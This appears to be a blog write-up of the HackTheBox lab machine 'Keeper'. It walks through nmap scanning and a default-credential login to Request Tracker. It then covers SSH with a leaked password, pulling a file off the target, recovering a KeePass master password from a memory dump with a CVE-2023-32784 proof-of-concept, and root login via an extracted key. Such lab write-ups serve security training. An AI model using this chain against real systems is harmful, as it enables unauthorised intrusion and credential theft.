---
title: Writeup for the machine Keeper from Hackthebox 
layout: post
post-image: "https://github.com/0xRar/0xrar.github.io/assets/33517160/8cae3e0d-8b98-4199-9a19-eaac13f71caa"
tags:
- Writeups
- HackTheBox
- Boot2Root
- Web
---

## Machine Information
- Name: Keeper
- Difficulty: Easy
- URL: [https://app.hackthebox.com/machines/Keeper] 

---

## Initial Enumeration
Starting with nmap:
```
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ nmap -p- -sV keeper.htb

Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 12:32 EST
Warning: 10.10.11.227 giving up on port because retransmission cap hit (10).
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.13s latency).
Not shown: 65333 closed tcp ports (conn-refused), 200 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.37 seconds
```

### HTTP (80)
Port 80 is hosting a static website that has a link to redirect to (`http://tickets.keeper.htb/rt/`),
which has `Request Tracker` its an enterprise-grade issue tracking system.

![port80](https://github.com/0xRar/0xrar.github.io/assets/33517160/a0ea394c-9013-4c8c-bd3a-848e3ffbefc3)

![rt](https://github.com/0xRar/0xrar.github.io/assets/33517160/49c954a0-6dd9-4e51-9da6-c5b3309d1115)

Looking for vulnerabilities for `Request Tracker version 4.4.4` turned out to be unfruitful,
so since we have a login looking for default creds is always a good idea, which i found on
the github repo: <a href="https://github.com/bestpractical/rt">(bestpractical/rt)</a>.

```
NOTE: The default credentials for RT are:
    User: root
    Pass: password
Not changing the root password from the default is a SECURITY risk!
```

Now that i had access to RT, I started looking for useful information and i found the users list,

![users list](https://github.com/0xRar/0xrar.github.io/assets/33517160/0d3d7827-4f9b-4f80-b11c-365db9422fd7)

the user `lnorgaard` had a note that is a password! 

![lnorgaard_pass](https://github.com/0xRar/0xrar.github.io/assets/33517160/908d9061-b230-4894-b236-59d242962ed6)

---

## Initial Foothold
Now there is a username and a password which i used to get a shell on the machine via ssh,
`lnorgaard:Welcome2023!`.

Listing the home directory content of `lnorgaard` shows a zip file `RT30000.zip`

```
lnorgaard@keeper:~$ ls 
RT30000.zip user.txt
```

I used a basic python web server to transfer it to my machine:
```
Target machine:
lnorgaard@keeper:~$ python3 -m http.server

Attacker machine:
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ wget http://keeper.htb:8000/RT30000.zip
```

---

## Privilege Escalation
Inside of the zip archive we have 2 files `KeePassDumpFull.dmp & passcodes.kdbx`,
kdbx is a file format for KeePassXC which is an offline password manager, at first
i thought i can just crack the hash of the database but that failed.

So second option for me was to check kdbx v2.x (`file passcodes.kdbx`)
and look for any related CVEs and i found `CVE-2023-32784`, this vulnerability can be
less interesting when you see that you need a keepass process dump which won't be 
a big deal for this machine because we have a dump of the process.

PoC I Used: [https://github.com/CMEPW/keepass-dump-masterkey]

The poc script will try and guess the letters of the master password:
```
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ python poc.py -d KeePassDumpFull.dmp
[.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

So the last possible password is the right one but its missing some letters,
so i google'd it and it turned out to be the name of a danish red berry pudding,
`rødgrød med fløde`.

![masterpass](https://github.com/0xRar/0xrar.github.io/assets/33517160/f8ab9eed-3501-46f5-954f-04e7a61fab80)

now that we have the password database we can see the root user notes which
has the contents of a .PPK or PuTTY Private Key using the PuTTYgen software,
the same way the ppk was created you can also turn it into an openssh pem file

![ppk](https://github.com/0xRar/0xrar.github.io/assets/33517160/cab7422f-ac0d-4dae-b4d8-43d554b1b2ea)

to turn the ppk to a private openssh i used this command:
```
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ puttygen key.ppk -O private-openssh -o root.pem
```

Logging in using the key: 
```
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ ssh -i root.pem root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

root@keeper:~# whoami
root
```

and thats it ! 

Thank You For Reading ❤

[https://app.hackthebox.com/machines/Keeper]: https://app.hackthebox.com/machines/Keeper
[https://github.com/CMEPW/keepass-dump-masterkey]: https://github.com/CMEPW/keepass-dump-masterkey
